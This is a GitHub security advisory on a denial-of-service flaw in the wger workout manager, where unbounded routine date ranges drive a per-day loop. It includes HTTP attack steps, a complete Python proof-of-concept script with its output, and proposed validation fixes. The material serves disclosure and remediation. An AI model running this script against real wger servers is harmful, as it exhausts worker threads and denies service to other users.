# [M] wger has an Uncontrolled Resource Consumption issue

## Summary
Severity: Medium
Advisory: GHSA-v25j-wqcw-fvhj
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-13
Source: https://github.com/advisories/GHSA-v25j-wqcw-fvhj
Type: github-advisory

## Affected
- PyPI: `wger` — affected >=0

## Details
### Summary

Any authenticated user can create a routine spanning an arbitrarily long date range (e.g. 100 years) and then trigger the `date_sequence` computation via any of the routine detail endpoints. The server iterates once per day in an unbounded `while` loop with no maximum duration validation, causing a single HTTP request to consume multiple seconds of server CPU and return a response containing tens of thousands of entries. Repeated requests can exhaust all worker threads and deny service to other users.

### Details

The `Routine` model (file: `wger/manager/models/routine.py`) has `start` and `end` date fields with only one validation -- `start` must not be after `end`:

```python
# File: wger/manager/models/routine.py, line 151
def clean(self):
    if self.end and self.start and self.start > self.end:
        raise ValidationError('The start time cannot be after the end time.')
    # NO maximum duration check
```

The `RoutineSerializer` (file: `wger/manager/api/serializers.py`, line 43) likewise performs no validation on the delta between `start` and `end`.

The `date_sequence` property (line 256) uses an unbounded loop:

```python
# File: wger/manager/models/routine.py, line 256
while current_date <= self.end:
    # heavy computation per day: slots, entries, configs, logs
    ...
```

A routine with `start=2000-01-01` and `end=2099-12-31` produces **36,525 iterations**, each performing O(slots x entries x configs) work. Five endpoints trigger this computation:

- `GET /api/v2/routine/<id>/date-sequence-display/`
- `GET /api/v2/routine/<id>/date-sequence-gym/`
- `GET /api/v2/routine/<id>/structure/`
- `GET /api/v2/routine/<id>/logs/`
- `GET /api/v2/routine/<id>/stats/`

### PoC

#### Prerequisites

- One authenticated user account
- No special permissions required

#### Attack Steps

```
# 1. Create a 100-year routine
POST /api/v2/routine/
Authorization: Token <token>
Content-Type: application/json

{
    "name": "DoS routine",
    "start": "2000-01-01",
    "end": "2099-12-31"
}

# 2. Add at least one day (to make computation non-trivial)
POST /api/v2/day/
Authorization: Token <token>
Content-Type: application/json

{
    "routine": <routine_id>,
    "order": 1,
    "name": "Day A"
}

# 3. Trigger the expensive computation
GET /api/v2/routine/<routine_id>/date-sequence-display/
Authorization: Token <token>
```

**Expected:** HTTP 400 (routine duration exceeds maximum)
**Actual:** HTTP 200 with 36,525 entries after several seconds of server CPU time

#### Proof of Concept Script

```python
#!/usr/bin/env python3
"""
PoC: Unbounded date_sequence Denial of Service
Target: wger Workout Manager
Severity: HIGH - CVSS 6.5
CWE-400: Uncontrolled Resource Consumption

Usage:
    python3 poc.py http://localhost:8000
"""

import requests
import sys
import time

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <BASE_URL>")
    print(f"Example: {sys.argv[0]} http://localhost:8000")
    sys.exit(1)

BASE = sys.argv[1].rstrip("/")
API = f"{BASE}/api/v2"

ATTACKER_USER = "dos_attacker_poc"
ATTACKER_PASS = "DosAttack!Poc!2025"

BANNER = """
=====================================================================
  PoC: Unbounded date_sequence Denial of Service
  Severity: HIGH
  CWE-400: Uncontrolled Resource Consumption
=====================================================================
"""
print(BANNER)


# ---- Helper ----
def api_login(username, password):
    r = requests.post(f"{API}/login/", json={
        "username": username, "password": password
    })
    if r.status_code == 200:
        return r.json().get("token")
    return None

def api_headers(token):
    return {"Authorization": f"Token {token}", "Content-Type": "application/json"}


# ---- 1. Authenticate ----

print("[1] Authenticating...")

token = api_login(ATTACKER_USER, ATTACKER_PASS)
if not token:
    print(f"    Registering account...")
    r = requests.post(f"{API}/register/", json={
        "username": ATTACKER_USER,
        "password": ATTACKER_PASS,
    })
    if r.status_code in (200, 201):
        token = r.json().get("token")
    if not token:
        token = api_login(ATTACKER_USER, ATTACKER_PASS)
    if not token:
        print(f"[-] Cannot authenticate. Response: {r.text[:200]}")
        sys.exit(1)
print(f"    Token: {token[:16]}...")

headers = api_headers(token)


# ---- 2. Create NORMAL routine (baseline) ----

print("\n[2] Creating baseline routine (30 days)...")

r = requests.post(f"{API}/routine/", headers=headers, json={
    "name": "Normal 30-day routine",
    "start": "2025-01-01",
    "end": "2025-01-31",
})
normal_id = r.json()["id"]

r = requests.post(f"{API}/day/", headers=headers, json={
    "routine": normal_id, "order": 1, "name": "Day A"
})

print(f"    Routine id={normal_id} (30 days)")
start_time = time.time()
r = requests.get(
    f"{API}/routine/{normal_id}/date-sequence-display/",
    headers=headers,
)
baseline_time = time.time() - start_time
baseline_entries = len(r.json()) if r.status_code == 200 else 0
print(f"    date-sequence-display: {r.status_code}, "
      f"{baseline_entries} entries, {baseline_time:.2f}s")


# ---- 3. Create MALICIOUS routine (100 years) ----

print(f"\n[3] Creating malicious routine (100 years = 36,525 days)...")

r = requests.post(f"{API}/routine/", headers=headers, json={
    "name": "DoS routine - 100 years",
    "start": "2000-01-01",
    "end": "2099-12-31",
})

if r.status_code != 201:
    print(f"    [-] Failed to create: {r.status_code} {r.text[:200]}")
    sys.exit(1)

dos_id = r.json()["id"]
print(f"    Routine id={dos_id}")
print(f"    start=2000-01-01, end=2099-12-31")
print(f"    Duration: ~36,525 days (NO validation limit!)")

r = requests.post(f"{API}/day/", headers=headers, json={
    "routine": dos_id, "order": 1, "name": "DoS Day"
})


# ---- 4. ATTACK ----

print(f"\n{'='*65}")
print(f"  ATTACK: Triggering date_sequence on 100-year routine")
print(f"{'='*65}")

print(f"\n  GET {API}/routine/{dos_id}/date-sequence-display/")
print(f"  This will iterate ~36,525 times in a while loop...")

start_time = time.time()
try:
    r = requests.get(
        f"{API}/routine/{dos_id}/date-sequence-display/",
        headers=headers,
        timeout=120,
    )
    elapsed = time.time() - start_time
    dos_entries = len(r.json()) if r.status_code == 200 else 0

    print(f"\n  Response: HTTP {r.status_code}")
    print(f"  Entries returned: {dos_entries}")
    print(f"  Time elapsed: {elapsed:.2f}s")

except requests.exceptions.Timeout:
    elapsed = time.time() - start_time
    dos_entries = 0
    print(f"\n  REQUEST TIMED OUT after {elapsed:.2f}s!")

except requests.exceptions.ConnectionError:
    elapsed = time.time() - start_time
    dos_entries = 0
    print(f"\n  CONNECTION LOST after {elapsed:.2f}s!")


# ---- 5. VERIFY ----

print(f"\n{'='*65}")
print(f"  VERIFICATION")
print(f"{'='*65}")

print(f"\n  Baseline (30-day routine):")
print(f"    Entries: {baseline_entries}")
print(f"    Time:    {baseline_time:.2f}s")
print(f"\n  Malicious (100-year routine):")
print(f"    Entries: {dos_entries}")
print(f"    Time:    {elapsed:.2f}s")

if elapsed > baseline_time * 5 or dos_entries > 10000:
    slowdown = elapsed / baseline_time if baseline_time > 0 else float('inf')
    print(f"\n  Slowdown factor: {slowdown:.1f}x")
    print("""
  +----------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                 |
  |                                                          |
  |  No maximum duration is enforced on routines.            |
  |  The date_sequence property loops once per day with no   |
  |  upper bound. A 100-year routine forces ~36,525          |
  |  iterations of expensive O(days x slots x configs) work. |
  |  A single request can exhaust a server worker thread.    |
  +----------------------------------------------------------+
""")
else:
    print("\n  Response was fast - server may have limits or caching.")
```

#### Proof of Concept Output

```
=====================================================================
  PoC: Unbounded date_sequence Denial of Service
  Severity: HIGH
  CWE-400: Uncontrolled Resource Consumption
=====================================================================

[1] Authenticating...
    Registering account...
    Token: 2ffbb18316fc4e0f...

[2] Creating baseline routine (30 days)...
    Routine id=5 (30 days)
    date-sequence-display: 200, 31 entries, 0.02s

[3] Creating malicious routine (100 years = 36,525 days)...
    Routine id=6
    start=2000-01-01, end=2099-12-31
    Duration: ~36,525 days (NO validation limit!)

=================================================================
  ATTACK: Triggering date_sequence on 100-year routine
=================================================================

  GET http://localhost/api/v2/routine/6/date-sequence-display/
  This will iterate ~36,525 times in a while loop...

  Response: HTTP 200
  Entries returned: 36525
  Time elapsed: 3.06s

=================================================================
  VERIFICATION
=================================================================

  Baseline (30-day routine):
    Entries: 31
    Time:    0.02s

  Malicious (100-year routine):
    Entries: 36525
    Time:    3.06s

  Slowdown factor: 138.4x

  +----------------------------------------------------------+
  |  VULNERABILITY CONFIRMED                                 |
  |                                                          |
  |  No maximum duration is enforced on routines.            |
  |  The date_sequence property loops once per day with no   |
  |  upper bound. A 100-year routine forces ~36,525          |
  |  iterations of expensive O(days x slots x configs) work. |
  |  A single request can exhaust a server worker thread.    |
  +----------------------------------------------------------+
```

### Impact

1. **Worker Thread Exhaustion:** Each malicious request ties up a server worker for 3+ seconds (more with populated slots/configs). A handful of concurrent requests can saturate all available workers, making the application unresponsive for legitimate users.
2. **Amplification with Slots:** The 3-second figure is for a routine with a single empty day. Adding exercises, slot entries, and progression configs multiplies the per-day cost. A fully populated 100-year routine could take minutes per request.
3. **No Authentication Barrier Beyond Login:** Any registered user can perform this attack. No elevated permissions are required.
4. **Cache Bypass:** The first request for each routine (or after `ROUTINE_CACHE_TTL` expires) always runs the full computation. An attacker can create new routines to avoid cache hits.
5. **Five Affected Endpoints:** `date-sequence-display`, `date-sequence-gym`, `structure`, `logs`, and `stats` all trigger the same unbounded loop.


### Fix

#### 1. Add maximum duration validation in the model

```python
# File: wger/manager/models/routine.py
MAX_ROUTINE_DAYS = 365

def clean(self):
    if self.end and self.start:
        if self.start > self.end:
            raise ValidationError('Start cannot be after end.')
        if (self.end - self.start).days > self.MAX_ROUTINE_DAYS:
            raise ValidationError(
                f'Routine cannot span more than {self.MAX_ROUTINE_DAYS} days.'
            )
```

#### 2. Add the same validation in the serializer

```python
# File: wger/manager/api/serializers.py
class RoutineSerializer(serializers.ModelSerializer):
    def validate(self, data):
        start = data.get('start')
        end = data.get('end')
        if start and end and (end - start).days > 365:
            raise serializers.ValidationError(
                'Routine cannot span more than 365 days.'
            )
        return data
```

#### 3. Add a safety cap in date_sequence (defence-in-depth)

```python
# File: wger/manager/models/routine.py, inside date_sequence property
MAX_SEQUENCE_DAYS = 400
count = 0
while current_date <= self.end:
    count += 1
    if count > MAX_SEQUENCE_DAYS:
        break
    ...
```

## References
- https://github.com/wger-project/wger/security/advisories/GHSA-v25j-wqcw-fvhj
- https://github.com/wger-project/wger/commit/5f07a4473e2c32d298c8cdd31d78e5107840039c
- https://github.com/wger-project/wger
